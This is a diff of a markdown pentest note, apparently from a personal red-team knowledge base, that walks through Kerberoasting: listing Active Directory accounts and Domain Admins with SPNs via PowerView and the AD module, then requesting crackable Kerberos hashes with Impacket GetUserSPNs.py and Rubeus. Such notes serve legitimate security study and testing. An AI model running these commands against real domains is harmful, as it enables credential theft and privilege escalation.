@@ -26,15 +26,23 @@ Domain services running with user accounts have a ServicePrincipalName (SPN). Re
 
 Domain services running with user accounts have a ServicePrincipalName (SPN). Requesting the hash for the user from DC to then crack.
 
+
+
 ## Objective
 
 1. Find a user or admin with SPN
 
 2. Request hash for user or admin from DC
 
+
+
 # Instructions
 
 1. Find a user with Service Principal Name (SPN) using PowerView
+
+
+
+
 
 **Command** ([[PowerView List AD Accounts with SPN Set]]):
 
@@ -42,7 +50,13 @@ Domain services running with user accounts have a ServicePrincipalName (SPN). Re
 Get-DomainUser -SPN
 ```
 
+
+
 (Alternative) Find a user with SPN using AD Module
+
+
+
+
 
 **Command** ([[List AD Accounts with SPN Set using ADModule]]):
 
@@ -50,7 +64,15 @@ Get-DomainUser -SPN
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
+
+
+
+
 (Optional) List Admin accounts with SPN Set using PowerView
+
+
+
+
 
 **Command** ([[List Domain Admins with SPN Set using PowerView]]):
 
@@ -58,7 +80,13 @@ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincip
 Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
 ```
 
+
+
 2. Request hash for user or admin from Domain Controller using Impacket
+
+
+
+
 
 **Command** ([[GetUserSPN.py Query Domain for SPNs and Dump Available Hashes]]):
 
@@ -66,13 +94,25 @@ Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'}
 GetUserSPNs.py '$_DOMAIN/$_USERNAME:$_PASSWORD' -dc-ip $_DOMAIN_IP -request
 ```
 
+
+
 (Optional) Request hash using Rubeus and specify only RC4 hash
+
+
+
+
 
 **Command** ([[Request RC4 HASH for SPN User]]):
 
 ```bash
 Rubeus.exe kerberoast /user:$USERNAME /simple /rc4opsec /outfile:C:\hash.text
 ```
+
+
+
+
+
+
 
 ## Commands Used
 
@@ -81,3 +121,5 @@ Rubeus.exe kerberoast /user:$USERNAME /simple /rc4opsec /outfile:C:\hash.text
 - [[List Domain Admins with SPN Set using PowerView]]
 - [[PowerView List AD Accounts with SPN Set]]
 - [[Request RC4 HASH for SPN User]]
+
+
